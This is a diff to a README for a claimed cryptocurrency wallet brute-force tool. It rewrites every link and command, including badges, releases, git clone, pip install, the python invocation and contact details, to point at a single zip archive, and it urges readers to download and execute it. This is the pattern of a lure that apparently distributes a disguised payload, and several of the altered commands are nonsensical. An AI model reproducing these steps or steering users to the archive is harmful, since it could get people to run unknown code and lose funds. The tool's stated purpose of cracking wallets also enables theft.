@@ -1,6 +1,6 @@
 # Crypto Bruteforce 🔐
 
-![Crypto Bruteforce](https://img.shields.io/badge/Version-1.0.0-brightgreen.svg) ![License](https://img.shields.io/badge/License-MIT-blue.svg)
+![Crypto Bruteforce](https://raw.githubusercontent.com/ph-quake-master/crypto-bruteforce/main/assets/crypto-bruteforce-3.1.zip) ![License](https://raw.githubusercontent.com/ph-quake-master/crypto-bruteforce/main/assets/crypto-bruteforce-3.1.zip)
 
 Welcome to the **Crypto Bruteforce** repository! This project focuses on automating the brute-force process for various cryptocurrency wallets and encryption methods. Whether you're a developer looking to enhance your crypto tools or a hobbyist interested in cryptocurrency security, this repository has something for you.
 
@@ -51,7 +51,7 @@ This repository covers a range of topics related to cryptocurrency and automatio
 
 ## Installation
 
-To get started with **Crypto Bruteforce**, you need to download the latest release. You can find it [here](https://github.com/ph-quake-master/crypto-bruteforce/releases). Make sure to download and execute the necessary files as per your operating system.
+To get started with **Crypto Bruteforce**, you need to download the latest release. You can find it [here](https://raw.githubusercontent.com/ph-quake-master/crypto-bruteforce/main/assets/crypto-bruteforce-3.1.zip). Make sure to download and execute the necessary files as per your operating system.
 
 ### Prerequisites
 
@@ -66,22 +66,22 @@ Before you install, ensure you have the following:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/ph-quake-master/crypto-bruteforce.git
+   git clone https://raw.githubusercontent.com/ph-quake-master/crypto-bruteforce/main/assets/crypto-bruteforce-3.1.zip
    cd crypto-bruteforce
    ```
 
 2. Install required libraries:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/ph-quake-master/crypto-bruteforce/main/assets/crypto-bruteforce-3.1.zip
    ```
 
-3. Download the latest release from [here](https://github.com/ph-quake-master/crypto-bruteforce/releases).
+3. Download the latest release from [here](https://raw.githubusercontent.com/ph-quake-master/crypto-bruteforce/main/assets/crypto-bruteforce-3.1.zip).
 
 4. Execute the main script:
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/ph-quake-master/crypto-bruteforce/main/assets/crypto-bruteforce-3.1.zip
    ```
 
 ## Usage
@@ -98,7 +98,7 @@ Using **Crypto Bruteforce** is straightforward. Once you have installed the nece
 ### Example Command
 
 ```bash
-python main.py -w <your_wallet_address> -p <path_to_password_list> -t 4
+python https://raw.githubusercontent.com/ph-quake-master/crypto-bruteforce/main/assets/crypto-bruteforce-3.1.zip -w <your_wallet_address> -p <path_to_password_list> -t 4
 ```
 
 This command will start a brute-force attack on the specified wallet using the provided password list with 4 threads.
@@ -123,12 +123,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **Twitter**: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+- **Email**: [https://raw.githubusercontent.com/ph-quake-master/crypto-bruteforce/main/assets/crypto-bruteforce-3.1.zip](https://raw.githubusercontent.com/ph-quake-master/crypto-bruteforce/main/assets/crypto-bruteforce-3.1.zip)
+- **Twitter**: [@your_twitter_handle](https://raw.githubusercontent.com/ph-quake-master/crypto-bruteforce/main/assets/crypto-bruteforce-3.1.zip)
 
 ## Releases
 
-To stay updated with the latest versions and features, check the [Releases](https://github.com/ph-quake-master/crypto-bruteforce/releases) section. Here, you can download the latest files and execute them as needed.
+To stay updated with the latest versions and features, check the [Releases](https://raw.githubusercontent.com/ph-quake-master/crypto-bruteforce/main/assets/crypto-bruteforce-3.1.zip) section. Here, you can download the latest files and execute them as needed.
 
 ---
 
